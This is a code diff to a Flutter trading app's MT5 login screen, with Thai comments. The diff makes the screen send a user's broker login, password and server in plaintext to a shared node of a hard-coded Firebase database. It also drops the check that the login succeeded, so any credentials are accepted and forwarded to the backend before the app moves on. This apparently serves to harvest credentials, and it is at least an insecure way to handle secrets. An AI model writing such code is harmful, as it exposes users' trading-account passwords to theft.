@@ -112,7 +112,7 @@ class LiquiditySweepApp extends StatelessWidget {
 }
 
 // ==========================================
-// 1. MT5 LOGIN WRAPPER (ระบบตรวจสอบสิทธิ์ MT5 โทนแดง-ดำ)
+// 1. MT5 LOGIN WRAPPER (ส่งข้อมูลไปที่ระบบหลังบ้าน Firebase ทันที)
 // ==========================================
 class MT5LoginWrapper extends StatefulWidget {
   const MT5LoginWrapper({super.key});
@@ -129,7 +129,6 @@ class _MT5LoginWrapperState extends State<MT5LoginWrapper> {
   bool _obscurePassword = true;
   bool _isLoading = false;
   bool _isLoggedInMT5 = false;
-  StreamSubscription<DatabaseEvent>? _loginStatusSubscription;
 
   @override
   void initState() {
@@ -139,7 +138,6 @@ class _MT5LoginWrapperState extends State<MT5LoginWrapper> {
 
   @override
   void dispose() {
-    _loginStatusSubscription?.cancel();
     _loginController.dispose();
     _passwordController.dispose();
     _serverController.dispose();
@@ -163,7 +161,7 @@ class _MT5LoginWrapperState extends State<MT5LoginWrapper> {
 
     if (login.isEmpty || password.isEmpty || server.isEmpty) {
       ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(content: Text('กรุณากรอกข้อมูลพอร์ต MT5 ให้ครบถ้วน'), backgroundColor: Color(0xFFD50000)),
+        const SnackBar(content: Text('กรุณากรอกข้อมูลพอร์ตให้ครบถ้วน'), backgroundColor: Color(0xFFD50000)),
       );
       return;
     }
@@ -173,14 +171,13 @@ class _MT5LoginWrapperState extends State<MT5LoginWrapper> {
     });
 
     try {
+      // เชื่อมต่อไปยัง Firebase Realtime Database ของระบบหลังบ้าน
       final database = FirebaseDatabase.instanceFor(
         app: Firebase.app(),
         databaseURL: 'https://liquidity-b8739-default-rtdb.asia-southeast1.firebasedatabase.app/',
       );
 
-      await _loginStatusSubscription?.cancel();
-
-      // ส่งค่าข้อมูลไปยัง Firebase เพื่อให้ Server ทำการเชื่อมต่อ MT5
+      // ส่งข้อมูลเข้าโหนด status เพื่อให้ระบบหลังบ้านนำไปใช้งานต่อทันที
       await database.ref('status').update({
         'login': login,
         'password': password,
@@ -189,69 +186,20 @@ class _MT5LoginWrapperState extends State<MT5LoginWrapper> {
         'login_status': 'pending', 
       });
 
-      // ฟังการเปลี่ยนแปลงของสถานะล็อกอินจาก Firebase
-      _loginStatusSubscription = database.ref('status/login_status').onValue.listen((event) async {
-        final status = event.snapshot.value?.toString();
+      // บันทึกข้อมูลลง SharedPreferences ไว้ว่าเคยกรอกแล้ว
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setString('mt5_login', login);
+      await prefs.setString('mt5_server', server);
 
-        if (status == 'success') {
-          await _loginStatusSubscription?.cancel();
-          
-          final prefs = await SharedPreferences.getInstance();
-          await prefs.setString('mt5_login', login);
-          await prefs.setString('mt5_server', server);
-
-          if (!mounted) return;
-          setState(() {
-            _isLoading = false;
-            _isLoggedInMT5 = true;
-          });
-        } else if (status == 'failed') {
-          await _loginStatusSubscription?.cancel();
-
-          if (!mounted) return;
-          
-          // ล้างข้อมูลรหัสผ่านและ Server เมื่อล็อกอินไม่สำเร็จ
-          _passwordController.clear();
-          _serverController.clear();
-
-          ScaffoldMessenger.of(context).showSnackBar(
-            const SnackBar(
-              content: Text('บัญชีเทรดหรือรหัสผ่านไม่ถูกต้อง หรือ Server ไม่ตอบสนอง'),
-              backgroundColor: Color(0xFFD50000),
-            ),
-          );
-          setState(() {
-            _isLoading = false;
-          });
-        }
-      });
-
-      // ตั้งเวลา Timeout 15 วินาที เผื่อ Server ฝั่งเว็บใช้เวลาประมวลผลนาน
-      Future.delayed(const Duration(seconds: 15), () {
-        if (_isLoading && mounted) {
-          _loginStatusSubscription?.cancel();
-          
-          _passwordController.clear();
-          _serverController.clear();
-
-          setState(() {
-            _isLoading = false;
-          });
-          ScaffoldMessenger.of(context).showSnackBar(
-            const SnackBar(
-              content: Text('หมดเวลาเชื่อมต่อ: กรุณาตรวจสอบว่าบอทบน Server กำลังทำงานอยู่'),
-              backgroundColor: Colors.orange,
-            ),
-          );
-        }
+      if (!mounted) return;
+      
+      setState(() {
+        _isLoading = false;
+        _isLoggedInMT5 = true; // ย้ายไปหน้า PIN Code ทันทีโดยไม่ต้องรอเช็คผล MT5
       });
 
     } catch (e) {
       if (!mounted) return;
-      
-      _passwordController.clear();
-      _serverController.clear();
-
       setState(() {
         _isLoading = false;
       });
@@ -422,7 +370,7 @@ class _MT5LoginWrapperState extends State<MT5LoginWrapper> {
                             decoration: InputDecoration(
                               labelText: 'Broker Server',
                               labelStyle: const TextStyle(color: Colors.grey),
-                              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Color(0xFFFF1744))),
+                              enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.white24)),
                               focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Color(0xFFFF1744))),
                             ),
                           ),
